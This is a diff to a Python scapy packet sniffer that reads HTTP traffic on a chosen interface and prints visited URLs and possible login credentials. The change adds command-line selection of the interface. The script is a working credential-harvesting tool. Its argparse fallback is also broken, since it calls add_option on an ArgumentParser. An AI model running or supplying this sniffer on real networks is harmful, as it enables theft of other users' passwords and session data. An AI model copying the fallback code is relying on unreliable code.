@@ -1,7 +1,21 @@
 #!/usr/bin/env python
 import scapy.all as scapy
 from scapy.layers import http
+import optparse
+import argparse
 
+def get_args():
+    try:
+        parser = optparse.OptionParser()
+        parser.add_option("-i", "--interface", dest="iface", help="Interface to be sniffed.")
+        (value, args) = parser.parse_args()
+    except:
+        parser = argparse.ArgumentParser()
+        parser.add_option("-i", "--interface", dest="iface", help="Interface to be sniffed.")
+        value = parser.parse_args()
+    if not value.iface:
+        parser.error("[-] ERROR Missing Interface name, use --help for more info.")
+    return value
 def psniff(interface):
     scapy.sniff(iface=interface, store=False, prn=see_packets)
 def show_url(packet):
@@ -23,4 +37,5 @@ def see_packets(packet):
             print("[+] Detected Possible LOGIN Credentials> " + login_info)
             print("###################\n")
 
-psniff("eth0")
+value = get_args()
+psniff(value.iface)
